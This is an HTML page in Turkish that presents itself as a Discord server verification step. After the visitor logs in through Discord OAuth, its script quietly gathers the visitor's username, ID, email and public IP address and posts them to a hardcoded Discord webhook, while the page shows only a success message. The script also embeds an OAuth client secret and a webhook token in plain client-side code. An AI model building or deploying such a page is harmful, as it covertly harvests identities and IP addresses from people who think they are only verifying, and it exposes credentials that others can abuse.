<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Discord Doğrulama</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #36393f;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      text-align: center;
    }
    .container {
      background-color: #2f3136;
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
      max-width: 500px;
      width: 100%;
    }
    h2 {
      color: #5865F2;
      margin-bottom: 20px;
    }
    .btn {
      background-color: #5865F2;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s;
      display: inline-block;
      text-decoration: none;
      margin-top: 15px;
    }
    .btn:hover {
      background-color: #4752C4;
    }
    .info-text {
      margin: 20px 0;
      color: #b9bbbe;
      font-size: 14px;
    }
    .status {
      margin-top: 20px;
      padding: 15px;
      border-radius: 4px;
      display: none;
    }
    .loading {
      display: none;
      margin: 20px auto;
      width: 50px;
      height: 50px;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #5865F2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .verified {
      background-color: #3ba55c;
      display: block;
    }
    .error {
      background-color: #ed4245;
      display: block;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Discord Doğrulama</h2>
    
    <div id="initialView">
      <p>Sunucumuza erişmek için Discord hesabınızla doğrulama yapmanız gerekmektedir.</p>
      <p class="info-text">Aşağıdaki butona tıklayarak doğrulama işlemini başlatabilirsiniz.</p>
      <a id="loginBtn" class="btn">
        <span>Discord ile Doğrula</span>
      </a>
    </div>
    
    <div id="verifyingView" style="display: none;">
      <div class="loading"></div>
      <p>Doğrulama yapılıyor, lütfen bekleyin...</p>
      <p class="info-text">Bu işlem birkaç saniye sürebilir.</p>
    </div>
    
    <div id="statusView" class="status" style="display: none;">
      <!-- Durum mesajı burada gösterilecek -->
    </div>
  </div>

  <script>
    const clientId = "1399152888214851595";
    const redirectUri = "https://verify-system.netlify.app/";
    const webhookUrl = "https://discord.com/api/webhooks/1399151324309881015/01oC6NPk2n7Mut17QfUvwsBUFRakn7rBYg52yTP7zI4IEfzEeMKePKD33IwgFvobyQGu";

    const params = new URLSearchParams(window.location.search);
    const code = params.get("code");

    // Elementleri seç
    const initialView = document.getElementById("initialView");
    const verifyingView = document.getElementById("verifyingView");
    const statusView = document.getElementById("statusView");
    const loginBtn = document.getElementById("loginBtn");

    // Login butonuna tıklandığında Discord OAuth'a yönlendir
    loginBtn.href = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email`;

    // IP adresini almak için fonksiyon
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("IP alınırken hata:", error);
        return "Erişilemedi";
      }
    }

    // Durum mesajını göster
    function showStatus(message, isSuccess) {
      initialView.style.display = "none";
      verifyingView.style.display = "none";
      statusView.style.display = "block";
      statusView.className = isSuccess ? "status verified" : "status error";
      statusView.innerHTML = `<p>${message}</p>`;
    }

    // Kod geldiyse token al ve webhooka gönder
    if (code) {
      // Doğrulama görünümünü göster
      initialView.style.display = "none";
      verifyingView.style.display = "block";
      
      (async () => {
        try {
          // IP adresini al
          const ipAddress = await getIP();
          
          // Token al
          const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({
              client_id: clientId,
              client_secret: "XwMSoMkHCF0_D9fnTQy7JlfX7mVOpwP4",
              grant_type: "authorization_code",
              code: code,
              redirect_uri: redirectUri,
              scope: "identify email",
            }),
          });
          
          const tokenData = await tokenResponse.json();
          
          // Kullanıcı bilgilerini al
          const userResponse = await fetch("https://discord.com/api/users/@me", {
            headers: {
              Authorization: `Bearer ${tokenData.access_token}`,
            },
          });
          
          const userData = await userResponse.json();
          
          // Avatar URL'sini oluştur
          const avatarUrl = userData.avatar 
            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=256`
            : null;
          
          // Webhook embed verisi
          const embed = {
            title: "Yeni Discord Doğrulaması",
            color: 0x5865F2,
            thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
            fields: [
              {
                name: "Kullanıcı Bilgileri",
                value: `**İsim:** ${userData.username}#${userData.discriminator}\n**ID:** ${userData.id}\n**Email:** ${userData.email || "Erişilemedi"}`,
                inline: false
              },
              {
                name: "IP Adresi",
                value: ipAddress,
                inline: false
              }
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: "Discord Doğrulama Sistemi"
            }
          };
          
          // Webhook'a gönder
          await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              embeds: [embed]
            }),
          });
          
          // Başarılı durum mesajını göster
          showStatus(
            "✅ Doğrulama başarılı!<br><br>" +
            "Teşekkür ederiz, Discord hesabınız başarıyla doğrulandı.<br>" +
            "Sunucudan iletişime devam edebilirsiniz.",
            true
          );
          
        } catch (err) {
          console.error("Hata oluştu:", err);
          showStatus(
            "❌ Doğrulama başarısız!<br><br>" +
            "Doğrulama sırasında bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            false
          );
        }
      })();
    }
  </script>
</body>
</html>
